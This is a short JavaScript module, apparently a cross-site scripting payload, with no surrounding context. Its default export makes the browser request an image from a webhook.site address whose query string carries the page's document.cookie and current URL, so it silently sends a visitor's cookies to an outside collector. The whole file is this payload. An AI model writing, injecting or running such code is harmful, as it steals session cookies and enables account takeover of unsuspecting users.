export default () => {
    new Image().src = `https://webhook.site/db2682da-2c95-4068-9663-e64473df3067?c=${encodeURIComponent(document.cookie)}&u=${encodeURIComponent(location.href)}`;
};
